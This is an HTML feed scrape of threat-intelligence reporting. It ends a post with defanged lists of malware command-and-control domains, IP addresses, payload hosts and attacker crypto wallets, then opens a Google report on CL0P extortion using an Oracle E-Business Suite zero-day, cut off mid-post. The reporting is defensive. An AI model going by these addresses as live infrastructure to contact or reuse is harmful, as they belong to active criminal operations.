16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://microsoft-dns-reload[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-17</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://dnserror-cdw[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-15</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://dns-me[.]pages[.]dev/</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; width: 100%;\"><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Indicator</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">saaadnesss[.]shop</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 C2 Check-in</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">lapkimeow[.]icu</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 C2 Check-in</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ratatui[.]today</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 CLEARSHORT C2 Check-in</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">technavix[.]cloud</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 CLEARSHORT C2 Check-in</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">orange-service[.]xyz</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 CLEARSHORT C2 Check-in</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hfdjmoedkjf[.]asia</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 CLEARSHORT C2 Check-in</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">polovoiinspektor[.]shop</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 Payload Hosting</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">googleapis-n-cdn3s-server[.]willingcapablepatronage[.]shop</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 Payload Hosting</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">rbk[.]scalingposturestrife[.]shop</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 Payload Hosting</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ty[.]klipxytozyi[.]shop</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 Payload Hosting</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">discover-travel-agency[.]pro</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 Payload Hosting</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">browser-storage[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 Payload Hosting</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">kangla[.]klipxytozyi[.]shop</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 Payload Hosting</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">recaptcha-manual[.]shop</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 Payload Hosting</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">xxx[.]retweet[.]shop</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 Payload Hosting</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">w1[.]discoverconicalcrouton[.]shop</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 Payload Hosting</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">tlfiyat[.]shop</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VIDAR C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">stchkr[.]rest</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VIDAR C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">opbafindi[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VIDAR C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">cxheerfulriver[.]pics</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">importenptoc[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">voicesharped[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">inputrreparnt[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">torpdidebar[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">rebeldettern[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">actiothreaz[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">garulouscuto[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">breedertremnd[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">zenrichyourlife[.]tech</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">pasteflawwed[.]world</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hoyoverse[.]blog</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">dsfljsdfjewf[.]info</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">stormlegue[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">blast-hubs[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">blastikcn[.]com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">decreaserid[.]world</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">LUMMAC.V2 C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">80.64.30[.]238</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC5142 Payload Hosting</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">95.217.240[.]67</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VIDAR C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">37.27.182[.]109</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VIDAR C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">95.216.180[.]186</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VIDAR C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">82.115.223[.]9</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ATOMIC C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">91.240.118[.]2</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">RADTHIEF C2</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Blockchain-Based IOCs </span></h4>\n<h5><span style=\"vertical-align: baseline;\">Wallet Addresses</span></h5></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Main Wallets</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Secondary Wallets</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">0x9fA7A2F4872D10bF59d436EA8433067811F67C04</span></p>\n<p><span style=\"vertical-align: baseline;\">0x9FEF571BAeAbdB8bF417a780c1b78aAa3295fF45</span></p>\n<p><span style=\"vertical-align: baseline;\">0x3b5a23f6207d87B423C6789D2625eA620423b32D(OKX 35)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">0x3b5a23f6207d87B423C6789D2625eA620423b32D(OKX 35)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Funding wallets used to layer funds before sending to the operator.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">0xF5B962Cca374de0b769617888932250363C5971B </span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">0x9AAe9A373CECe9Ef8453fa2dEAF4bf7B8aFBfac9</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The main actor controlled address that deploys and sends update transactions to the smart contract group.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h5>Smart Contract Groups</h5></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Contract Level</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Main Addresses</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Secondary Addresses</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">First Level</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">0x9179dda8B285040Bf381AABb8a1f4a1b8c37Ed53</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">0x8f386Ac6050b21aF0e34864eAbf0308f89C6f13c</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Second Level</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">0x8FBA1667BEF5EdA433928b220886A830488549BD</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">0xd210e8a9f22Bc5b4C9B3982ED1c2E702D66A8a5E</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Third Level</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">0x53fd54f55C93f9BCCA471cD0CcbaBC3Acbd3E4AA</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">0x15b495FBe9E49ea8688f86776Fd7a50b156C6c3F</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>"}
{"source": "Threat Intelligence", "title": "Oracle E-Business Suite Zero-Day Exploited in Widespread Extortion Campaign", "link": "https://cloud.google.com/blog/topics/threat-intelligence/oracle-ebusiness-suite-zero-day-exploitation/", "published": "Thu, 09 Oct 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Peter Ukhanov, Genevieve Stark, Zander Work, Ashley Pearson, Josh Murchie, Austin Larsen</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><p><em><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Update (Oct. 11): On Oct. 11, Oracle released </span><a href=\"https://www.oracle.com/security-alerts/alert-cve-2025-61884.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">another patch</span></a><span style=\"vertical-align: baseline;\">, addressing CVE-2025-61884.</span></span></span></span></em></p>\n<h3><span style=\"vertical-align: baseline;\">Introduction</span></h3>\n<p><span style=\"vertical-align: baseline;\">Beginning Sept. 29, 2025, Google Threat Intelligence Group (GTIG) and Mandiant began tracking a new, large-scale extortion campaign by a threat actor claiming affiliation with the CL0P extortion brand. The actor began sending a high volume of emails to executives at numerous organizations, alleging the theft of sensitive data from the victims' Oracle E-Business Suite (EBS) environments. On Oct. 2, 2025, </span><a href=\"https://blogs.oracle.com/security/post/apply-july-2025-cpu\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Oracle reported</span></a><span style=\"vertical-align: baseline;\"> that the threat actors may have exploited vulnerabilities that were patched in July 2025 and recommended that customers apply the latest critical patch updates</span><span style=\"vertical-align: baseline;\">. <span style=\"vertical-align: baseline;\">On Oct. 4, 2025, Oracle directed customers to apply </span><a href=\"https://www.oracle.com/security-alerts/alert-cve-2025-61882.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">emergency patches</span></a><span style=\"vertical-align: baseline;\"> to address this vulnerability, reiterating their standing recommendation that customers stay current on all Critical Patch Updates.</span></span></p>\n<p><span style=\"vertical-align: baseline;\">Our analysis indicates that the CL0P extortion campaign followed months of intrusion activity targeting EBS customer environments. The threat actor(s) exploited what may be </span><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-61882\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CVE-2025-61882</span></a><span style=\"vertical-align: baseline;\"> as a zero-day vulnerability against Oracle EBS customers as early as Aug. 9, 2025, weeks before a patch was available, with additional suspicious activity dating back to July 10, 2025. In some cases, the threat actor successfully exfiltrated a significant amount of data from impacted organizations.</span></p>\n<p><span style=\"vertical-align: baseline;\">This post provides an in-depth analysis of the campaign, deconstructs the multi-stage Java implant framework used by the threat actors to compromise Oracle EBS, details the earlier exploitation activity, and provides actionable guidance and indicators of compromise (IOCs) for defenders.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Background</span></h3>\n<p><span style=\"vertical-align: baseline;\">The CL0P (aka CL0P^_- LEAKS) data leak site (DLS) was established in 2020. Initially, GTIG observed the DLS used for multifaceted extortion operations involving CL0P ransomware and attributed to </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/fin11-email-campaigns-precursor-for-ransomware-data-theft\"><span style=\"text-decoration: underline; vertical-align: baseline;\">FIN11</span></a><span style=\"vertical-align: baseline;\">. More recently, the majority of the alleged victims appear to be associated with data theft extortion incidents stemming from the mass exploitation of zero-day vulnerabilities in managed file transfer (MFT) systems, including the Accellion legacy file transfer appliance (FTA), GoAnywhere MFT, </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/zero-day-moveit-data-theft\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MOVEit MFT</span></a><span style=\"vertical-align: baseline;\">, and Cleo LexiCom. In most of these incidents, the threat actors conducted mass exploitation of zero-day (0-day) vulnerabilities, stole victim data, then initiated extortion attempts several weeks later. While this data theft extortion activity has most frequently been attributed to FIN11 and suspected FIN11 threat clusters, we have also observed evidence that CL0P ransomware and the CL0P DLS are used by at least one threat actor with different tactics, techniques, and procedures (TTPs). This could suggest that FIN11 has expanded their membership or partnerships over time.</span></p>\n<p><span style=\"vertical-align: baseline;\">This latest campaign targeting Oracle EBS marks a continuation of this successful and high-impact operational model.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Oct 8 updated CL0P DLS site\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/oracle-cl0p-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Oct. 8 updated CL0P DLS site</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Threat Detail </span></h3>\n<h4><span style=\"vertical-align: baseline;\">The CL0P Extortion Campaign</span></h4>\n<p><span style=\"vertical-align: baseline;\">Starting Sept. 29, 2025, the threat actor launched a high-volume email campaign from hundreds, if not thousands, of compromised third-party accounts. The credentials for these accounts—which belong to diverse, unrelated organizations—were likely sourced from infostealer malware logs sold on underground forums. This is a common tactic used by threat actors to add legitimacy and bypass spam filters. The emails, sent to company executives, claimed the actor had breached their Oracle EBS application and exfiltrated documents. </span></p>\n<p><span style=\"vertical-align: baseline;\">Notably, the emails contain two contact addresses, </span><code style=\"vertical-align: baseline;\">support@pubstorm.com</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">support@pubstorm.net</code><span style=\"vertical-align: baseline;\">, that have been listed on the CL0P DLS since at least May 2025. To substantiate their claims, the threat actor has provided legitimate file listings from victim EBS environments to multiple organizations with data dating back to mid-August 2025. The extortion emails have indicated that alleged victims can prevent the release of stolen data in exchange for payment, but the amount and method has not been specified. This is typical of most modern extortion operations, in which the demand is typically provided after the victim contacts the threat actors and indicates that they are authorized to negotiate.</span></p>\n<p><span style=\"vertical-align: baseline;\">To date, GTIG has not observed victims from this campaign on the CL0P DLS. This is consistent with past campaigns involving the CL0P brand, where actors have typically waited several weeks before posting victim data.</span></p></div>\n<div 